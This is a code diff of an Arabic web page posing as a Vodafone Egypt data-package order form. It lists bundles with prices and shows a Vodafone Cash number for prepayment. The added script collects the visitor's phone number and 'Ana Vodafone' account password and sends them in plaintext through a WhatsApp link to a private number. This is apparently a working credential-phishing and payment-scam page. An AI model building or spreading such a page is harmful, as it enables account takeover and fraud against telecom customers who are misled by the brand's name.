@@ -6,75 +6,112 @@
 <title>طلب باقات فودافون</title>
 <style>
 body{background:#0a0a0a;color:#fff;font-family:Arial;margin:0;padding:20px;text-align:center}
-h1{font-size:22px;margin-bottom:5px}
-.subtitle{color:#aaa;margin-bottom:20px;font-size:14px}
-.box{background:#1a1a1a;border:2px solid #333;border-radius:12px;padding:15px;margin:10px 0;cursor:pointer;transition:0.3s}
-.box:hover{border-color:#555}
-.box.active{border:2px solid #E60000;background:#2a0000}
-.box-title{font-size:18px;font-weight:bold}
-.price{color:#E60000;font-size:20px;font-weight:bold;margin-top:5px}
-.section{max-width:500px;margin:20px auto;text-align:right}
+h1{font-size:24px;margin-bottom:5px}
+.subtitle{color:#aaa;margin-bottom:25px;font-size:14px}
+.section-title{text-align:right;font-size:16px;font-weight:bold;margin:20px 0 10px}
+.box{background:#1a1a1a;border:2px solid #333;border-radius:12px;padding:18px;margin:10px 0;text-align:right;cursor:pointer;transition:0.2s}
+.box.selected{border:2px solid #E60000;background:#1a0000}
+.box-title{font-size:18px;font-weight:bold;margin-bottom:5px}
+.price{color:#E60000;font-size:20px;font-weight:bold}
+.section{max-width:500px;margin:0 auto}
 .label{font-weight:bold;margin-top:15px;text-align:right;font-size:16px}
-input,select{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:1px solid #333;background:#1a1a1a;color:#fff;text-align:right;font-size:16px}
+input,select{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:1px solid #333;background:#1a1a1a;color:#fff;text-align:right;font-size:16px;box-sizing:border-box}
+input::placeholder{color:#555}
 .cash{background:#1a0000;border:2px dashed #E60000;padding:20px;border-radius:12px;margin-top:20px;text-align:center}
+.cash-title{font-size:16px;margin-bottom:10px}
 .cash-num{color:#E60000;font-size:24px;font-weight:bold;letter-spacing:2px;margin:10px 0}
-.btn-copy{background:#E60000;color:#fff;border:none;padding:10px 25px;border-radius:8px;cursor:pointer;font-weight:bold}
+.btn-copy{background:#E60000;color:#fff;border:none;padding:10px 25px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:16px}
 .btn-whatsapp{background:#25D366;color:#fff;border:none;padding:16px;border-radius:12px;width:100%;font-size:18px;font-weight:bold;margin-top:20px;cursor:pointer}
+.note{color:#aaa;font-size:12px;margin-top:10px}
 </style>
 </head>
 <body>
 
 <h1>طلب باقات فودافون</h1>
-<p class="subtitle">1. اختار الباقة المطلوبة ثم املأ البيانات</p>
-
-<div class="section" id="packages">
-    <div class="box"><div class="box-title">5200 ميجا</div><div class="price">120 جنيه</div></div>
-    <div class="box"><div class="box-title">10400 ميجا</div><div class="price">220 جنيه</div></div>
-    <div class="box"><div class="box-title">7500 ميجا</div><div class="price">120 جنيه</div></div>
-    <div class="box"><div class="box-title">11500 ميجا</div><div class="price">180 جنيه</div></div>
-    <div class="box"><div class="box-title">20 الف ميجا</div><div class="price">280 جنيه</div></div>
-    <div class="box"><div class="box-title">31500 ميجا</div><div class="price">440 جنيه</div></div>
-    <div class="box"><div class="box-title">49 الف ميجا</div><div class="price">550 جنيه</div></div>
-</div>
+<p class="subtitle">اختار الباقة المطلوبة ثم املأ البيانات</p>
 
 <div class="section">
-    <div class="label">2. رقم فودافون</div><input type="tel" id="phone" placeholder="01xxxxxxxxx">
-    <div class="label">3. كلمة مرور أنا فودافون</div><input type="password" id="password" placeholder="اختياري">
-    <div class="label">ملاحظة</div><select id="note"><option>أول مرة بتعامل معاكم</option><option>نسيت كلمة المرور</option></select>
+    <div class="section-title">1. اختر الباقة</div>
+    
+    <div class="box" data-package="5200 ميجا - 150 جنيه">
+        <div class="box-title">5200 ميجا</div>
+        <div class="price">150 جنيه</div>
+    </div>
+    <div class="box" data-package="10400 ميجا - 250 جنيه">
+        <div class="box-title">10400 ميجا</div>
+        <div class="price">250 جنيه</div>
+    </div>
+    <div class="box" data-package="7500 ميجا - 120 جنيه">
+        <div class="box-title">7500 ميجا</div>
+        <div class="price">120 جنيه</div>
+    </div>
+    <div class="box" data-package="11500 ميجا - 180 جنيه">
+        <div class="box-title">11500 ميجا</div>
+        <div class="price">180 جنيه</div>
+    </div>
+    <div class="box" data-package="20 الف ميجا - 280 جنيه">
+        <div class="box-title">20 الف ميجا</div>
+        <div class="price">280 جنيه</div>
+    </div>
+    <div class="box" data-package="31500 ميجا - 440 جنيه">
+        <div class="box-title">31500 ميجا</div>
+        <div class="price">440 جنيه</div>
+    </div>
+    <div class="box" data-package="49 الف ميجا - 550 جنيه">
+        <div class="box-title">49 الف ميجا</div>
+        <div class="price">550 جنيه</div>
+    </div>
+
+    <div class="section-title">2. رقم فودافون</div>
+    <input type="tel" id="phone" placeholder="01xxxxxxxxx">
+    
+    <div class="section-title">3. كلمة مرور أنا فودافون</div>
+    <input type="password" id="password" placeholder="اكتب الباسورد أو اتركها فارغة">
+    
+    <div class="section-title">إذا كنت لا تعرف كلمة المرور</div>
+    <select id="note">
+        <option>أول مرة بتعامل معاكم</option>
+        <option>نسيت كلمة المرور</option>
+    </select>
 </div>
 
 <div class="section cash">
-    <div>رقم فودافون كاش للتحويل 💳</div>
+    <div class="cash-title">رقم فودافون كاش للتحويل 💳</div>
     <div class="cash-num">01035562989</div>
-    <button class="btn-copy" onclick="navigator.clipboard.writeText('01035562989');alert('تم نسخ الرقم')">نسخ الرقم</button>
+    <button class="btn-copy" onclick="copyCash()">نسخ الرقم</button>
 </div>
 
-<button class="btn-whatsapp" onclick="sendOrder()">إرسال الطلب عبر واتساب 💬</button>
+<button class="btn-whatsapp" onclick="sendWhatsApp()">إرسال الطلب عبر واتساب 💬</button>
+<p class="note">بعد الضغط سيتم فتح واتساب برسالة الطلب جاهزة</p>
 
 <script>
 let selectedPackage = "";
 
-// لما تدوس على باقة
+// تحديد الباقة
 document.querySelectorAll('.box').forEach(box => {
   box.addEventListener('click', function(){
-    document.querySelectorAll('.box').forEach(b => b.classList.remove('active'));
-    this.classList.add('active');
-    selectedPackage = this.querySelector('.box-title').innerText + " - " + this.querySelector('.price').innerText;
+    document.querySelectorAll('.box').forEach(b => b.classList.remove('selected'));
+    this.classList.add('selected');
+    selectedPackage = this.getAttribute('data-package');
   });
 });
 
-function sendOrder(){
+function copyCash(){
+  navigator.clipboard.writeText("01035562989");
+  alert("تم نسخ الرقم بنجاح");
+}
+
+function sendWhatsApp(){
   if(selectedPackage == ""){
     alert("من فضلك اختار باقة الأول");
     return;
   }
   let phone = document.getElementById("phone").value;
-  if(phone == ""){alert("اكتب رقم فودافون"); return;}
+  if(phone == ""){alert("من فضلك اكتب رقم فودافون"); return;}
   
   let pass = document.getElementById("password").value;
   let note = document.getElementById("note").value;
-  
-  let msg = `طلب باقة جديد%0A%0Aالباقة: ${selectedPackage}%0Aالرقم: ${phone}%0Aالباسورد: ${pass}%0Aالملاحظة: ${note}`;
+  let msg = `طلب باقة جديد%0A%0Aالباقة: ${selectedPackage}%0Aالرقم: ${phone}%0Aالباسورد: ${pass}%0Aملاحظة: ${note}`;
   window.open(`https://wa.me/201035562989?text=${msg}`, '_blank');
 }
 </script>
